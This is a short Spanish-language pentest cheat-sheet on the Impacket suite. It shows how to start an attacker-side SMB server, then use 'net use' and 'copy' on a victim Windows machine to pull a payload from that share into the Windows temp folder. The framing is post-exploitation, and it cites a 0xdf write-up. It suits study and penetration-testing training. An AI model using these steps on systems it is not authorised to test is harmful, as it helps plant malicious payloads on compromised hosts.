Suite de scripts Python para manipular protocolos de red (SMB, NTLM, Kerberos, MSSQL, LDAP, etc.).
[Repo](https://github.com/fortra/impacket)
```
impacket-<script> [opciones]
```

| Script / Parámetro | Función | Ejemplo de sintaxis |
| ------------------ | ------- | ------------------- |
| smbserver          |         |                     |

# Protips
## Post-Exploitation Windows File Transfers with SMB
### Atacante
1. Iniciar el servidor. `shareName` es un valor arbitrario que se debe anotar para posterior conexión, `sharePath` es la carpeta que se quiere compartir
```
impacket-smbserver.py shareName sharePath
```
### Víctima
1. Usando `net use` nos conectamos al dir compartido
```powershell
C:\>net use --> Para comprobar conexiones activas
C:\>net use \\[host]\[share name] --> Para conectarnos al share
C:\>net use /d \\[host]\[share name] --> Para eliminar la conexión
```
2. Conexión + traer el payload
```
net use \\[host]\[share]
copy \\[host]\[share]\[payload] \windows\temp\nothing.exe
```

# Recursos
[Post-Exploitation Windows File Transfers with SMB](https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html)